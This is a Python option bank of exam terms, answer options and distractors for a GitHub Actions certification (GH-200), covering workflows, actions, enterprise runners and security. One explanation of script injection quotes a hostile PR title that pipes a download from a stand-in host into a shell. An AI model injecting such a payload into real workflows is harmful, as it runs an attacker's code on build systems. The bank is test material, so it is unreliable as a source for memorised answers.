"""Terminology and option bank for Exam GH-200: GitHub Actions (January 2026 study guide)."""

from sequences import SEQUENCES

ATOMIC_TERMS = {
    # --- Domain 1: Author and manage workflows (1.1–1.15) ---
    'wf_triggers_events': (
        'Configure `schedule` (POSIX UTC cron on default branch), `workflow_dispatch`, webhook events (`push`, `pull_request`, `release`), and external `repository_dispatch` (`POST /repos/{owner}/{repo}/dispatches`)',
        'GitHub Actions triggers span UTC `cron` schedules on the default branch, manual `workflow_dispatch`, Git/GitHub webhooks, and external REST `repository_dispatch` events.'
    ),
    'wf_scope_perms_filters': (
        'Combine activity `types:` (`e.g., [opened, synchronize, reopened]`), `branches`/`paths-ignore` filters, least-privilege `permissions:`, and `concurrency:` groups',
        'Scoping webhook activity `types:`, branch/path filters, explicit minimal `permissions:`, and `concurrency` prevents unnecessary or over-privileged runs.'
    ),
    'wf_dispatch_call_inputs': (
        'Define typed `workflow_dispatch.inputs` (`string`, `boolean`, `choice`, `number`, `environment`) and map `workflow_call` `inputs:` + `secrets:` explicitly',
        '`workflow_dispatch` provides rich UI-validated input types (`up to 10 inputs`), while `workflow_call` validates reusable-workflow `inputs` and `secrets`.'
    ),
    'wf_jobs_steps_conds': (
        'Control job/step flow with `if:` status functions (`success()`, `failure()`, `always()`, `cancelled()`), `continue-on-error`, and `timeout-minutes`',
        'Status check functions in `if:` (`such as if: failure() or if: always() && !cancelled()`) govern cleanup and notification execution cleanly.'
    ),
    'wf_job_dependencies_needs': (
        'Chain jobs into a DAG via `needs: [build, lint]`, reading upstream `needs.<job_id>.outputs.<key>` and `needs.<job_id>.result`',
        'Jobs run in parallel by default; declaring `needs:` enforces execution order and exposes upstream job `outputs` and `result` states.'
    ),
    'wf_commands_env_files': (
        'Append `KEY=VALUE` to `$GITHUB_ENV`, paths to `$GITHUB_PATH`, outputs to `$GITHUB_OUTPUT`, and emit `::notice::` / `::error::` / `::add-mask::` commands',
        'Modern environment files (`$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`) replaced deprecated `::set-env` / `::set-output` commands to mitigate injection.'
    ),
    'wf_service_containers': (
        'Configure `jobs.<id>.services` (`image`, `env`, `ports`, `--health-cmd` `options`), connecting via `localhost:<port>` on host runners or `<label>:<port>` in job `container:`',
        'Service containers spin up sidecar databases/queues with Docker health probes; host steps use mapped `localhost` ports whereas job containers use service labels.'
    ),
    'wf_matrix_runner_images': (
        'Use `strategy.matrix` (`include`, `exclude`, `fail-fast`, `max-parallel`, `<=256` jobs) and track hosted image migrations (`Ubuntu 20.04` retired; `windows-latest` -> Windows Server 2025)',
        'Matrices expand up to 256 job variants per workflow run, and pinning explicit OS versions (`ubuntu-24.04`, `windows-2025`) avoids surprise `*-latest` image brownouts.'
    ),
    'wf_yaml_anchors_aliases': (
        'Define YAML anchors (`&base_env`), aliases (`*base_env`), and merge keys (`<<: *base_env`) to deduplicate repeated mappings or job blocks inside one `.yml` file',
        'GitHub Actions natively parses YAML 1.1/1.2 node anchors (`&`), aliases (`*`), and map merges (`<<:`) within the same workflow file.'
    ),
    'wf_contexts_immutable_act': (
        'Read runtime metadata from contexts (`github`, `runner`, `env`, `vars`, `secrets`, `inputs`, `matrix`, `needs`, `steps`) and account for Immutable Actions (`GHCR` OCI packages)',
        'Workflows inspect structured contexts at the appropriate scope while Immutable Actions distribute tamper-proof OCI action packages via `pkg.actions.githubusercontent.com` / `ghcr.io`.'
    ),
    'wf_expressions_eval': (
        'Evaluate `${{ ... }}` built-in functions (`contains`, `startsWith`, `format`, `join`, `toJSON`, `fromJSON`, `hashFiles`), separating parse-time keys from runtime step contexts',
        'Built-in expression functions enable dynamic JSON matrices (`fromJSON`) and lockfile cache keys (`hashFiles`) without shell-parsing overhead.'
    ),
    'wf_vscode_extension': (
        'Use the official **GitHub Actions VS Code extension** for live YAML schema validation, `action.yml` input IntelliSense, context/secrets hover checks, and run management',
        'The official GitHub Actions VS Code extension validates workflow syntax, autocompletes action `with:` inputs and `vars`/`secrets`, and inspects runs in-editor.'
    ),
    'wf_cache_artifact_api': (
        'Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies',
        'Caches accelerate cross-run package restores (`evicted after 7 unused days or >10 GB`), whereas artifacts persist build outputs per workflow run.'
    ),
    'wf_pass_data_outputs': (
        'Pass intra-job values via `$GITHUB_OUTPUT` / `$GITHUB_ENV` (`steps.<id>.outputs`), cross-job primitives via `jobs.<id>.outputs` (`needs`), and binary files via v4 artifacts',
        'Each job executes on a fresh isolated runner environment, so cross-job transfer requires declared `jobs.<id>.outputs` strings or uploaded workflow artifacts.'
    ),
    'wf_step_summary_badges': (
        'Write GitHub Flavored Markdown tables/charts to `$GITHUB_STEP_SUMMARY` (`<=1 MB`/step) and embed branch/event-scoped workflow status badges (`badge.svg`)',
        'Appending Markdown to `$GITHUB_STEP_SUMMARY` renders rich test/coverage reports on the workflow run summary page.'
    ),

    # --- Domain 2: Consume and troubleshoot workflows (2.1–2.9) ---
    'trb_interpret_triggers_sha': (
        'Distinguish `pull_request` (`GITHUB_SHA` = ephemeral test merge commit `refs/pull/:n/merge`) from `push` (`GITHUB_SHA` = branch head commit `refs/heads/<branch>`)',
        'On `pull_request` events, GitHub checks out the simulated merge commit (`refs/pull/:num/merge`) rather than the raw PR head commit (`github.event.pull_request.head.sha`).'
    ),
    'trb_diagnose_logs_debug': (
        'Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)',
        'Step debug (`::debug::`) and runner debug logs isolate workflow logic errors from runner OOM (`137`) or command-not-found (`127`) failures.'
    ),
    'trb_expand_yaml_anchors': (
        'Trace YAML anchor (`&`), alias (`*`), and merge (`<<:`) resolution order—where local explicit keys defined alongside `<<: *anchor` override anchored defaults',
        'When expanding `<<: *defaults` in a YAML mapping, keys explicitly written in the child mapping take precedence over keys inherited from `*defaults`.'
    ),
    'trb_matrix_rerun_failed': (
        'Correlate failed matrix job titles to `matrix.*` axes and select `Re-run failed jobs` (`gh run rerun <id> --failed` or single-job rerun) to re-test without re-billing green legs',
        'GitHub Actions supports re-running all jobs, **only failed jobs** (and their downstream dependents), or **one specific job** up to 30 days after initial run creation.'
    ),
    'trb_locate_logs_api_cli': (
        'Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)',
        'Both the GitHub CLI (`gh run`) and Actions Workflow Runs REST API expose run metadata, timing, check suites, and downloadable log archives.'
    ),
    'trb_artifacts_v4_manage': (
        'Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)',
        'In `upload-artifact@v4`, artifacts are immutable once uploaded—matrix jobs must include `${{ matrix.* }}` in `name:` and merge via `pattern:` on download.'
    ),
    'trb_consume_reusable_wf': (
        'Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)',
        'Reusable workflows execute under the caller repository `GITHUB_TOKEN`/context, support up to 4 nesting levels, and accept explicit `with:` inputs and `secrets:`.'
    ),
    'trb_starter_vs_reusable_comp': (
        'Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)',
        'Starter workflows copy a static `.yml` into a repo once (`edits to the template never propagate`), unlike centrally versioned Reusable workflows or Composite actions.'
    ),
    'trb_disable_vs_delete_wf': (
        'Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`',
        'Disabling a workflow stops runaway `schedule`/`webhook` triggers immediately without losing historical run logs or deleting repository source files.'
    ),

    # --- Domain 3: Author and maintain actions (3.1–3.8) ---
    'act_javascript_node20': (
        'Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution',
        'JavaScript actions run directly on Linux, Windows, and macOS host runners with sub-second startup (`no Docker image pull/build overhead`) and support `pre:`/`post:` cleanup.'
    ),
    'act_docker_vs_composite': (
        'Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)',
        'Docker actions guarantee exact Linux OS dependencies (`Linux-only, slower image startup`), whereas Composite actions chain cross-OS `run:` (`shell:` required) and `uses:` steps.'
    ),
    'act_immutable_actions_err': (
        'Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)',
        'Immutable Actions package releases into immutable OCI artifacts so published versions cannot be silently overwritten, while `core.setFailed()` logs an `::error::` annotation and sets exit code `1`.'
    ),
    'act_metadata_action_yml': (
        'Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)',
        'Every JavaScript, Docker, and Composite custom action requires a valid `action.yml` / `action.yaml` metadata file defining its interface and runtime.'
    ),
    'act_toolkit_commands_state': (
        'Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks',
        '`@actions/core` safely escapes multiline environment file values, masks secrets via `setSecret()`, and passes state between `pre:` -> `main:` -> `post:` scripts via `saveState`/`getState`.'
    ),
    'act_distribution_models': (
        'Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories',
        'Enterprise teams can share private/internal actions across organizations without publishing proprietary code to the public internet or GitHub Marketplace.'
    ),
    'act_marketplace_publish': (
        'Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release',
        'GitHub Marketplace requires a public repository containing a single root `action.yml` (`no other actions`), `2FA`, and checking `Publish this Action to the GitHub Marketplace` on a Release.'
    ),
    'act_semver_major_sha': (
        'Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)',
        'Maintaining SemVer tags (`v1.2.0`), sliding major tags (`v1`), and full 40-character SHA references (`Dependabot updates both SHA and comment`) balances ergonomics and supply-chain safety.'
    ),

    # --- Domain 4: Manage GitHub Actions for the enterprise (4.1–4.9) ---
    'ent_reusable_required_wf': (
        'Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**',
        'Reusable workflows let teams opt into shared jobs, whereas Repository Ruleset Required Workflows enforce un-editable governance checks automatically across matching repos.'
    ),
    'ent_access_sharing_cfg': (
        'Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)',
        'Even on an `Internal` repository, sibling organizations cannot invoke its `workflow_call` or actions until `Actions -> General -> Access` explicitly enables enterprise/org sharing.'
    ),
    'ent_use_policies_sha': (
        'Enforce `Allow select actions and reusable workflows` (`GitHub-created`, `Verified creators`, internal `org/*`), **`Require actions to be pinned to a full-length commit SHA`**, and fork PR approvals',
        'Enterprise/Org Actions policies block unvetted Marketplace code, reject mutable `@v1`/`@main` tags when full-SHA pinning is required, and gate external fork PR runs.'
    ),
    'ent_runners_hosted_arc': (
        'Combine standard/`ubuntu-slim` hosted runners, autoscaling **Larger runners** (static IPs, GPU, high RAM), and ephemeral self-hosted runners (`--ephemeral`, `generate-jitconfig`, Kubernetes `ARC` `gha-runner-scale-set`)',
        'Ephemeral single-job runners (`hosted`, `--ephemeral`, `JIT`, or `ARC` scale-set pods authenticated via GitHub App) eliminate cross-job workspace contamination.'
    ),
    'ent_networking_ip_vnet': (
        'Connect Linux/Windows **Larger runners** to **Azure VNets** (`GitHub.Network/networkSettings` + Network Configurations), configure self-hosted `.env` proxies, and allow `pkg.actions.githubusercontent.com` + `ghcr.io`',
        'Azure Private Networking injects Linux/Windows Larger runners into private subnets (`not arm64 macOS`), and firewall allowlists must permit `*.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.'
    ),
    'ent_runner_groups_diag': (
        'Isolate compute in Enterprise/Org **Runner Groups** (`Selected orgs` -> `Selected repos` -> `Selected workflows`, blocking `Public` repos) and inspect `_diag/Runner_*.log` vs `Worker_*.log`',
        'Runner Groups enforce multi-tenant blast-radius boundaries down to approved workflow YAML paths, while `_diag/Runner_*.log` (listener) and `Worker_*.log` (job) speed triage.'
    ),
    'ent_preinstalled_toolcache': (
        'Check `actions/runner-images` release notes & `$RUNNER_TOOL_CACHE` (`setup-node`/`setup-python`/`setup-java` resolve cached binaries first or download + cache) vs custom golden images / `container:` jobs',
        'Official `actions/setup-*` actions check `$RUNNER_TOOL_CACHE` on hosted/self-hosted runners before downloading, avoiding slow `apt-get` builds on every run.'
    ),
    'ent_secrets_vars_scope': (
        'Scope encrypted `secrets.*` (`<=48 KB`, write-only) and plain-text `vars.*` across `Organization`, `Repository`, and `Environment` (`precedence: Environment > Repository > Organization`)',
        'Both `secrets.*` and `vars.*` resolve by specificity (`Environment` overrides `Repository`, which overrides `Organization`), and Org secrets should scope to `Selected repositories`.'
    ),
    'ent_secrets_rest_api': (
        'Manage secrets & variables programmatically via REST API (`encrypting secrets client-side with LibSodium crypto_box_seal against .../public-key`) or `gh secret set` / `gh variable set`',
        'The Actions Secrets REST API accepts only client-side LibSodium sealed-box `encrypted_value` + `key_id`, whereas `/actions/variables` manages plain-text config strings.'
    ),

    # --- Domain 5: Secure and optimize automation (5.1–5.7) ---
    'sec_env_gates_marketplace': (
        'Gate deployments with **Environments** (`Required reviewers`, `Prevent self-review`, `Wait timer`, `Selected branches/tags`, **Custom deployment protection rules**) and vet Marketplace actions (`Verified creator`, source & SHA audit)',
        'Deployment Environments hold production secrets/OIDC until human and webhook gates pass, and `Verified creator` badges indicate partner identity (`still audit source & pin 40-char SHA!`).'
    ),
    'sec_script_injection_fix': (
        'Prevent **script injection** by never interpolating untrusted `${{ github.event.* }}` (`PR title/body, branch head_ref, issue comment`) directly inside `run:`—bind via `env:` (`PR_TITLE: ${{ ... }}`) and quote `"$PR_TITLE"`',
        'GitHub expands `${{ ... }}` **before** handing `run:` text to `bash`/`pwsh`; binding untrusted text into an `env:` variable keeps shell metacharacters (`$(...)`, backticks) inert.'
    ),
    'sec_github_token_least_priv': (
        'Enforce org-default `Read-only` `GITHUB_TOKEN`, grant minimal job-level `permissions:` (`e.g., contents: read, pull-requests: write`), and use short-lived **GitHub App installation tokens** (`not PATs`) for cross-repo calls',
        '`GITHUB_TOKEN` is ephemeral to a single job and scoped strictly to the current repository; cross-repo automation should mint 1-hour GitHub App tokens via `actions/create-github-app-token`.'
    ),
    'sec_oidc_cloud_federation': (
        'Eliminate static cloud keys with **OIDC** (`permissions: id-token: write`), validating `iss` (`https://token.actions.githubusercontent.com`), `aud`, and strict `sub` / `job_workflow_ref` claims in AWS/Azure/GCP/Vault',
        'OIDC mints short-lived per-job JWTs; cloud trust policies must pin `sub` (`e.g., repo:org/app:environment:production`) and `aud` so other repos or feature branches cannot assume roles.'
    ),
    'sec_sha_attestations_slsa': (
        'Pin actions to **40-char commit SHAs** (`aligned with Immutable Actions`) and generate/verify **SLSA Artifact Attestations** (`actions/attest-build-provenance` / `actions/attest@v4` + `gh attestation verify`)',
        'Full 40-character SHA pinning + Immutable Actions prevent upstream tag hijacking, while Sigstore-backed Artifact Attestations prove cryptographic build provenance at deploy time.'
    ),
    'opt_cache_retention_api': (
        'Accelerate builds with `actions/cache@v4` (`hashFiles` keys + `restore-keys` fallback) and lower storage spend via `retention-days` + REST API org/repo artifact & log retention caps',
        'Right-sizing `retention-days` (`e.g., 5–14d instead of 90d default`) and configuring `/orgs/{org}/actions/permissions/artifact-and-log-retention` slashes metered GB-month storage.'
    ),
    'opt_scaling_cost_perf': (
        'Cut runner spend with `concurrency: { cancel-in-progress: true }`, path filters, Linux (`1x`) / `ubuntu-slim` over Windows (`2x`) / macOS (`10x`), lean matrices (`exclude`), and `timeout-minutes` caps',
        'Canceling superseded PR runs, skipping doc-only pushes, avoiding 10x macOS runners for Linux workloads, and capping `timeout-minutes` eliminate wasted billable minutes.'
    ),

    # --- Multi-Select Atomic Options (clean 1-clause statements <= 190 chars) ---
    'ms_d1_dispatch_typed_inputs': (
        'Define `on.workflow_dispatch.inputs` (`choice`, `boolean`, `environment`, `string`) for validated manual runs and `on.workflow_call` for cross-workflow reuse',
        '`workflow_dispatch` validates manual UI/API triggers (`up to 10 typed inputs`), while `workflow_call` exposes typed reusable workflow interfaces.'
    ),
    'ms_d1_github_output_needs': (
        'Write step outputs to `>> "$GITHUB_OUTPUT"` (`mapped via jobs.<id>.outputs`) so downstream `needs:` jobs read `needs.<id>.outputs.<name>`',
        '`$GITHUB_OUTPUT` paired with `jobs.<id>.outputs` is the supported mechanism for passing string metadata between separate jobs.'
    ),
    'ms_d1_yaml_anchors_dry': (
        'Use YAML anchors (`&common`), aliases (`*common`), and map merges (`<<: *common`) to share repeated `env:` or step/job settings within a single `.yml` file',
        'YAML anchors (`&`), aliases (`*`), and merge keys (`<<:`) eliminate duplicate boilerplate inside a single workflow file.'
    ),
    'ms_d1_matrix_include_failfast': (
        'Use `strategy.matrix` (`include`/`exclude`, `fail-fast: false`, `max-parallel`) while pinning explicit runner OS images (`ubuntu-24.04`, `windows-2025`)',
        '`fail-fast: false` lets all matrix variants finish reporting test results, and explicit image labels prevent unexpected `*-latest` migration breakages.'
    ),
    'ms_d2_rerun_failed_debug': (
        'Use `Re-run failed jobs` with `Enable debug logging` (`setting ACTIONS_STEP_DEBUG and ACTIONS_RUNNER_DEBUG`) to diagnose flaky variants cleanly',
        'Selective failed-job reruns with debug logging capture verbose step and runner diagnostics without re-running passing matrix combinations.'
    ),
    'ms_d2_v4_artifact_pattern': (
        'Give each matrix job a unique `upload-artifact@v4` name (`artifact-${{ matrix.os }}`) and merge them downstream with `download-artifact@v4` (`pattern: artifact-*`, `merge-multiple: true`)',
        'Because `upload-artifact@v4` artifacts are immutable once uploaded, matrix legs upload distinct artifact names and fan-in jobs merge them via `pattern:`.'
    ),
    'ms_d2_starter_vs_reusable': (
        'Publish one-time scaffold templates in `<org>/.github/workflow-templates/*.yml` + `.properties.json`, and centralize ongoing governed CI logic in `workflow_call` reusable workflows',
        'Starter templates bootstrap new repos as independent copies, whereas `workflow_call` reusable workflows centralize ongoing maintenance in one versioned file.'
    ),
    'ms_d2_disable_keep_history': (
        'Disable noisy or paused workflows (`gh workflow disable` / UI) rather than deleting `.yml` files when historical run logs and quick re-enablement are required',
        'Disabling halts triggers while preserving run history and source YAML in the repository.'
    ),
    'ms_d3_js_ncc_bundle_dist': (
        'Target `runs.using: "node20"` in `action.yml` and commit compiled `dist/index.js` (`bundled with @vercel/ncc or esbuild`) so consumers skip `npm install`',
        'Bundling dependencies into committed `dist/index.js` makes JavaScript actions self-contained and fast across Linux, Windows, and macOS.'
    ),
    'ms_d3_composite_explicit_shell': (
        'Declare `runs.using: "composite"` in `action.yml`, specify `shell:` on every `run:` step, and reference helper scripts via `${{ github.action_path }}`',
        'Composite actions require explicit `shell:` on every `run:` step and locate files inside the action repo via `github.action_path`.'
    ),
    'ms_d3_semver_sha_immutable': (
        'Publish immutable SemVer releases (`v1.2.3`), slide major tag `v1` for compatible updates, and encourage consumers to pin full 40-char commit SHAs (`with Immutable Actions`)',
        'Combining immutable SemVer releases, major `v1` convenience tags, and 40-char SHA pinning follows GitHub official action release guidance.'
    ),
    'ms_d4_internal_access_toggle': (
        'Store shared actions/reusable workflows in `Internal`/`Private` repos with `Actions -> General -> Access` enabled for the enterprise and enforce `Allow select actions` + full-SHA pinning',
        'Enterprise reuse combines `Internal`/`Private` repo `Access` sharing with allowlist + 40-character SHA pinning policies.'
    ),
    'ms_d4_arc_runner_groups': (
        'Deploy ephemeral `ARC` (`gha-runner-scale-set`) or Larger runners inside **Runner Groups** restricted to selected orgs, selected repos, and trusted workflow paths (`never Public repos`)',
        'Scoped Runner Groups + ephemeral single-job runners protect enterprise compute and internal networks.'
    ),
    'ms_d4_azure_vnet_allowlist': (
        'Attach **Azure Private Networking** (`GitHub.Network/networkSettings`) to Linux/Windows Larger runners and allow `*.actions.githubusercontent.com` (`pkg.actions...`) + `ghcr.io` on firewalls',
        'Linux/Windows Larger runners join Azure VNets via `NetworkSettings`, and egress allowlists must include `pkg.actions.githubusercontent.com` + `ghcr.io` for Immutable Actions.'
    ),
    'ms_d4_env_secret_precedence': (
        'Scope sensitive credentials via `Environment > Repository > Organization` `secrets.*` (`encrypted via LibSodium on REST API`) and store plain-text parameters in `vars.*`',
        'Environment secrets take highest precedence (`gated by reviewers/branches`), REST updates require LibSodium sealed boxes, and `vars.*` keeps non-secret config readable.'
    ),
    'ms_d5_env_script_hardening': (
        'Pass untrusted `github.event.*` text (`PR titles, branch names, comments`) through intermediate `env:` variables (`never raw ${{ ... }} inside run:`) and never checkout untrusted forks in `pull_request_target`',
        'Binding untrusted event fields to `env:` variables stops shell command injection, and avoiding fork checkouts in `pull_request_target` prevents secret exfiltration.'
    ),
    'ms_d5_oidc_attest_slsa': (
        'Use **OIDC** (`id-token: write`) with strict `sub`/`aud` claims for cloud auth and sign/verify **SLSA Artifact Attestations** (`attestations: write` + `gh attestation verify`)',
        'OIDC eliminates static cloud keys while `actions/attest-build-provenance` + `gh attestation verify` enforce cryptographic supply-chain provenance.'
    ),
    'ms_d5_cache_concurrency_opt': (
        'Enable `concurrency: { cancel-in-progress: true }` on PR branches, cache dependencies with `actions/cache@v4`, lower `retention-days`, and prefer Linux (`1x`) over macOS (`10x`)',
        'Canceling superseded PR runs, caching lockfile dependencies, shortening artifact retention, and right-sizing runner OS tiers cut CI latency and metered cost.'
    ),

    # --- Proposed Solution Evaluations (Yes / No architectural adequacy items) ---
    'sol_yes': (
        'Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement',
        'Every trigger, context, permission, runner, and security boundary in the proposed solution aligns with official GitHub Actions behavior.'
    ),
    'sol_no_script_injection_run': (
        'No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first',
        'Raw `${{ ... }}` expands before shell parsing so an attacker PR title like `"; curl evil.sh | sh #` executes arbitrary code; pass via `env:` (`TITLE: ${{ ... }}`) and quote `"$TITLE"`.'
    ),
    'sol_no_pull_request_target_pwn': (
        'No — `on: pull_request_target` runs with base-repo `secrets.*` and write-capable `GITHUB_TOKEN`; checking out and executing untrusted fork PR code leaks secrets immediately',
        'Never checkout and build untrusted fork `pull_request.head.sha` inside `pull_request_target`; run untrusted tests in unprivileged `on: pull_request` instead.'
    ),
    'sol_no_docker_action_on_macos': (
        'No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions',
        'Jobs running on `macos-latest` or `windows-latest` fail if a step invokes a `runs.using: "docker"` action; use `node20` JavaScript or `composite` actions for multi-OS support.'
    ),
    'sol_no_starter_wf_not_dynamic': (
        'No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow',
        'Starter templates only scaffold initial file creation; centrally updating CI logic across 100 repos requires a Reusable Workflow (`on: workflow_call`) or Required Workflow.'
    ),
    'sol_no_v4_artifact_overwrite': (
        'No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)',
        'Unlike legacy v3, `upload-artifact@v4` finalizes artifacts immediately and forbids appending/overwriting the same artifact name across parallel matrix jobs.'
    ),
    'sol_no_github_env_cross_job': (
        'No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`',
        'Each job boots a fresh runner environment, so `$GITHUB_ENV` is destroyed when the job ends; cross-job strings must be exposed via `jobs.<id>.outputs`.'
    ),
    'sol_no_cron_non_default_branch': (
        'No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository\'s **default branch** (`and shortest cron interval is every 5 minutes`)',
        'Pushing a `schedule:` workflow solely to a feature branch (`feat/nightly`) never triggers cron runs until merged into the default branch (`main`).'
    ),
    'sol_no_marketplace_multi_action': (
        'No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)',
        'Marketplace rejects repositories that are `Private`/`Internal`, lack a root `action.yml`, or bundle multiple actions inside one repository.'
    ),

    # --- High-Signal Plausible Distractors (Realistic anti-patterns <= 200 chars) ---
    'bad_deprecated_set_output': (
        'Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners',
        '`::set-output` and `::set-env` were permanently disabled/deprecated due to injection risks; use `>> "$GITHUB_OUTPUT"` and `>> "$GITHUB_ENV"`.'
    ),
    'bad_secrets_in_if_job_parse': (
        'Reference `${{ secrets.DEPLOY_KEY != \'\' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step',
        '`on:` triggers do not evaluate `secrets` expressions (`and jobs.<id>.if cannot read secrets directly without env/inputs mapping`), and echoing secrets risks exposure.'
    ),
    'bad_yaml_anchor_across_files': (
        'Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file',
        'Standard YAML anchors (`&`) and aliases (`*`) resolve **only within the same single YAML document/file**; cross-file reuse requires Reusable Workflows or Composite Actions!'
    ),
    'bad_mutable_main_branch_pin': (
        'Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally',
        'Floating `@main` references let an upstream compromise immediately execute malicious code with full write permissions inside your CI environment.'
    ),
    'bad_cache_for_permanent_releases': (
        'Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)',
        '`actions/cache` is an ephemeral performance cache evicted after **7 days** of non-use or when repo cache exceeds **10 GB**; store release outputs as Artifacts/Releases!'
    ),
    'bad_Composite_missing_shell': (
        'Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`',
        'Composite actions fail schema validation if any `run:` step omits `shell:`, unlike normal workflow jobs which provide a default OS shell.'
    ),
    'bad_node12_unbundled_js': (
        'Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit',
        '`node12`/`node16` runtimes are deprecated in favor of `node20`, and omitting bundled `dist/` (and `node_modules/`) breaks JavaScript actions immediately with `Cannot find module`.'
    ),
    'bad_public_repo_self_hosted': (
        'Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs',
        'Self-hosted runners on public repos expose internal networks and persistent disk secrets to arbitrary untrusted fork Pull Request code execution.'
    ),
    'bad_org_secret_overrides_env': (
        'Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name',
        'Actions secret and variable resolution follows specificity (`Environment > Repository > Organization`), so Environment values always win over Org values.'
    ),
    'bad_macos_arm_azure_vnet': (
        'Attach an Enterprise **Azure Private Network (`VNet`)** configuration directly to standard `ubuntu-latest` free runners or `arm64` macOS Larger runners',
        'Azure Private Networking (`GitHub.Network/networkSettings`) is supported strictly on **Linux and Windows Larger runners**, not standard shared runners or `arm64` macOS.'
    ),
    'bad_oidc_wildcard_trust': (
        'Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback',
        'Wildcard `repo:*:*` lets any repository on GitHub assume your production cloud role, and `vars.*` is unencrypted plain text.'
    ),
    'bad_block_ghcr_immutable_fw': (
        'Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions',
        'Immutable Actions distribute OCI action packages from `ghcr.io` / `pkg.actions.githubusercontent.com`; blocking those hosts breaks action downloads during job setup!'
    ),
}

TERMS = {}
for _k, _v in list(ATOMIC_TERMS.items()) + list(SEQUENCES.items()):
    assert _k not in TERMS, f'Duplicate key {_k}'
    assert len(_v[0]) <= 245, f'{_k} label len {len(_v[0])} > 245'
    assert len(_v[1]) <= 240, f'{_k} note len {len(_v[1])} > 240'
    TERMS[_k] = _v

assert len(set(v[0] for v in TERMS.values())) == len(TERMS), 'Duplicate option label detected!'
